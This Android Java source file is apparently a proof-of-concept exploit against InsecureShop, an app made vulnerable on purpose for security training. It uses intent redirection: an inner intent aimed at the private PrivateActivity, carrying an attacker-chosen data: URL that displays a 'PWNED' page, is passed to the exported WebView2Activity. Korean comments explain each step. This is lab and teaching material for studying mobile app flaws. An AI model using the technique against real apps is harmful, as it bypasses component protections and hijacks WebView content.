package com.aas.redirector;
import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
public class MainActivity extends Activity {
    protected void onCreate(Bundle st) {
        super.onCreate(st);
        // 공격자가 통제하는, PrivateActivity(비공개) 를 겨냥한 '안쪽 인텐트'
        Intent inner = new Intent();
        inner.setClassName("com.insecureshop", "com.insecureshop.PrivateActivity");
        inner.putExtra("url",
            "data:text/html,<html><body style='margin:0;background:%23b00020;color:%23fff;font-family:sans-serif'>"
          + "<div style='padding:40px'><h1>PWNED</h1>"
          + "<p>com.aas.redirector 가 intent redirection 으로</p>"
          + "<p>비공개(exported=false) PrivateActivity 를 열고</p>"
          + "<p>이 WebView 의 URL 까지 통제했다.</p></div></body></html>");
        // exported 인 WebView2Activity 에 넘기면, 그 앱이 대신 startActivity(inner) 해 준다
        Intent outer = new Intent();
        outer.setClassName("com.insecureshop", "com.insecureshop.WebView2Activity");
        outer.putExtra("extra_intent", inner);
        outer.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(outer);
        finish();
    }
}
